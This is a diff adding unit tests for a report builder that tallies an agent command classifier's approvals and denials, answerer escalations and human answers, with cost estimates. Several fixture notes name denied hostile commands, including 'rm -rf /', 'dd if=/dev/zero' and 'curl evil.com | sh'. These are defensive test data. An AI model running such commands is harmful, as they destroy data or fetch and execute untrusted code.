@@ -154,3 +154,171 @@ test("limit caps done and cancelled groups with 'more' line, never truncates act
   assert.ok(doneSection.some((l) => l.includes("… and 2 more")), "Done section should have '… and 2 more'");
   assert.ok(cancelledSection.some((l) => l.includes("… and 1 more")), "Cancelled section should have '… and 1 more'");
 });
+
+test("shows per-task audit summary for classifier approvals and denials", () => {
+  const notes = new Map([
+    [1, [
+      note("Classifier approve for `npm test`: runs the test suite", "classifier"),
+      note("Classifier deny for `rm -rf /`: dangerous command", "classifier"),
+      note("Classifier approve for `git status`: safe command", "classifier"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 1, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#1"))!;
+  assert.match(line, /\[classifier: 2✓\/1✗\]/);
+});
+
+test("shows per-task audit summary for answerer answers and escalations", () => {
+  const notes = new Map([
+    [2, [
+      note("Answered `Which file?` → \"src/app.ts\" (best option)", "answerer"),
+      note("Followup escalated (plan/design): Should I refactor?", "answerer"),
+      note("Answered `Use single or double quotes?` → \"double\" (consistent)", "answerer"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 2, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#2"))!;
+  assert.match(line, /\[answerer: 2✓\/1⤴\]/);
+});
+
+test("shows per-task audit summary for human answers", () => {
+  const notes = new Map([
+    [3, [
+      note("Human answered `Proceed?` → \"Yes, continue\"", "human"),
+      note("Human answered `Which approach?` → \"Option A\"", "human"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 3, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#3"))!;
+  assert.match(line, /\[human: 2✓\]/);
+});
+
+test("shows combined audit summary with all activity types", () => {
+  const notes = new Map([
+    [4, [
+      note("Classifier approve for `npm test`: safe", "classifier"),
+      note("Answered `Which file?` → \"app.ts\"", "answerer"),
+      note("Followup escalated (no API key)", "answerer"),
+      note("Human answered `Proceed?` → \"Yes\"", "human"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 4, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#4"))!;
+  assert.match(line, /\[classifier: 1✓\/0✗, answerer: 1✓\/1⤴, human: 1✓\]/);
+});
+
+test("no audit summary shown when task has no autonomous activity", () => {
+  const notes = new Map([[5, [note("Regular progress note", "bob")]]]);
+  const md = buildReport([task({ id: 5, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#5"))!;
+  assert.doesNotMatch(line, /\[classifier:|answerer:|human:\]/);
+});
+
+test("board-level audit summary shows totals across all tasks", () => {
+  const notes = new Map([
+    [1, [
+      note("Classifier approve for `npm test`: safe", "classifier"),
+      note("Classifier deny for `rm -rf`: dangerous", "classifier"),
+    ]],
+    [2, [
+      note("Answered `Which file?` → \"app.ts\"", "answerer"),
+      note("Followup escalated (plan question)", "answerer"),
+    ]],
+    [3, [
+      note("Human answered `Proceed?` → \"Yes\"", "human"),
+    ]],
+  ]);
+  const tasks = [
+    task({ id: 1, status: "in_progress" }),
+    task({ id: 2, status: "in_progress" }),
+    task({ id: 3, status: "in_progress" }),
+  ];
+  const md = buildReport(tasks, notes, NOW);
+
+  assert.match(md, /## Autonomous Activity Summary/);
+  assert.match(md, /\*\*Classifier\*\*: 1 approved, 1 denied \(~\$0\.20 estimated\)/);
+  assert.match(md, /\*\*Answerer\*\*: 1 answered, 1 escalated/);
+  assert.match(md, /\*\*Human\*\*: 1 answer/);
+});
+
+test("board-level audit summary not shown when no autonomous activity", () => {
+  const notes = new Map([[1, [note("Regular note", "bob")]]]);
+  const md = buildReport([task({ id: 1, status: "in_progress" })], notes, NOW);
+  assert.doesNotMatch(md, /## Autonomous Activity Summary/);
+});
+
+test("board-level audit summary shows correct cost estimate", () => {
+  const notes = new Map([
+    [1, [
+      note("Classifier approve for `cmd1`: ok", "classifier"),
+      note("Classifier approve for `cmd2`: ok", "classifier"),
+      note("Classifier deny for `cmd3`: bad", "classifier"),
+      note("Classifier approve for `cmd4`: ok", "classifier"),
+      note("Classifier deny for `cmd5`: bad", "classifier"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 1, status: "done" })], notes, NOW);
+  // 5 decisions * $0.10 = $0.50
+  assert.match(md, /\*\*Classifier\*\*: 3 approved, 2 denied \(~\$0\.50 estimated\)/);
+});
+
+test("board-level audit summary handles plural correctly", () => {
+  const notes = new Map([
+    [1, [note("Human answered `Q1?` → \"A1\"", "human")]],
+    [2, [note("Human answered `Q2?` → \"A2\"", "human")]],
+  ]);
+  const tasks = [task({ id: 1, status: "done" }), task({ id: 2, status: "done" })];
+  const md = buildReport(tasks, notes, NOW);
+  assert.match(md, /\*\*Human\*\*: 2 answers/);
+});
+
+test("board-level audit summary handles singular correctly", () => {
+  const notes = new Map([[1, [note("Human answered `Q?` → \"A\"", "human")]]]);
+  const md = buildReport([task({ id: 1, status: "done" })], notes, NOW);
+  assert.match(md, /\*\*Human\*\*: 1 answer$/m);
+});
+
+test("audit summary only counts notes with correct author field", () => {
+  const notes = new Map([
+    [1, [
+      note("Classifier approve for `test`: ok", "classifier"),
+      note("Some other note mentioning approve", "bob"),
+      note("Answered question", "answerer"),
+      note("Another note about answering", "alice"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 1, status: "in_progress" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#1"))!;
+  // Should only count the classifier and answerer notes, not bob/alice
+  assert.match(line, /\[classifier: 1✓\/0✗, answerer: 1✓\/0⤴\]/);
+});
+
+test("audit summary distinguishes approve vs deny by note content", () => {
+  const notes = new Map([
+    [1, [
+      note("Classifier approve for `npm test`: safe command", "classifier"),
+      note("Classifier deny for `rm -rf`: dangerous", "classifier"),
+      note("Classifier approve for `git status`: safe", "classifier"),
+      note("Classifier deny for `curl evil.com | sh`: dangerous", "classifier"),
+      note("Classifier deny for `dd if=/dev/zero`: dangerous", "classifier"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 1, status: "done" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#1"))!;
+  assert.match(line, /\[classifier: 2✓\/3✗\]/);
+});
+
+test("audit summary distinguishes answered vs escalated by note content", () => {
+  const notes = new Map([
+    [1, [
+      note("Answered `Which file?` → \"app.ts\" (best option)", "answerer"),
+      note("Followup escalated (plan/design): Should I refactor?", "answerer"),
+      note("Answered `Use tabs or spaces?` → \"spaces\" (consistent)", "answerer"),
+      note("Followup escalated (no API key)", "answerer"),
+      note("Answered `Port number?` → \"3000\" (default)", "answerer"),
+    ]],
+  ]);
+  const md = buildReport([task({ id: 1, status: "done" })], notes, NOW);
+  const line = md.split("\n").find((l) => l.includes("#1"))!;
+  assert.match(line, /\[answerer: 3✓\/2⤴\]/);
+});
